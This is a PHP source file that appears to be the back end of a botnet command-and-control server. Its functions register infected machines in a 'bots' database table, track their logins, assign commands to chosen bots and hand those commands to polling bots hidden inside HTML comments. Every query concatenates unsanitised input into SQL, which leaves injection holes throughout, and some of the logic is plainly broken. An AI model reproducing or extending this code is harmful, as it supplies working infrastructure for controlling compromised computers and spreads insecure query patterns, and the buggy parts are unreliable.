<?php

function SetBotCommand($sql,$command){
$a="UPDATE bots SET Command='".$command."  "."' WHERE ".$sql;
$b00l=mysql_query($a) or die('SetbotCommad:'.mysql_error());
 return $b00l;}

function IsBotInDB($serial,$name){  
       $sql="SELECT ID FROM bots WHERE Serial='$serial' AND name='$name'";  
  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       if ($row['ID']=='')
         {echo '<!--wait-->';
          return 1;}
       elseif($row['ID']=='') 
         {
           return 0;
         }
}

function GetBotID($serial,$name){       
       $sql="SELECT ID FROM bots WHERE Serial='$serial' AND name='$name'";  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       return $row['ID'];       
}

function GetBotCmd($ID){
       $sql="SELECT Command FROM bots WHERE ID='$ID'";  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       echo '<!--';
       echo $row['Command'];
       echo '-->';
       echo '!wait';
        
}

function AddBotToDB($serial,$name){//country 
//current date     
  $date1=date(d);
        $date2=date(m);
         $date3=date(y);
//login time
$second=microtime();
$timestamp=explode(" ",$second);
$country_code='UNK';
/*//country depending on ip       
      $geoip = Net_GeoIP::getInstance('GeoIp.dat', Net_GeoIP::SHARED_MEMORY) or die("getinstance:". mysql_error());
	  echo 'test2';
       $country_code = $geoip->lookupCountryCode($_SERVER['REMOTE_ADDR']) or die("lookupCo.code:". mysql_error());
	   echo 'test3';*/
       $sql="INSERT INTO bots (ID,Serial,name,Command,Date,Login)
                      VALUES(NULL,'$serial','$name',NULL,'$date1.$date2.$date3','$timestamp[1]');";
					  //echo $country_code;
      $query=mysql_query($sql) or die("ADDBOTTODB:". mysql_error());
}

function SetLoginDate($id){
$second=microtime();
$timestamp=explode(" ",$second);
$sql="UPDATE bots Set Login=$timestamp[1] WHERE ID='$id'";
$query=mysql_query($sql) or die("SetLoginDate:". mysql_error());
}
?>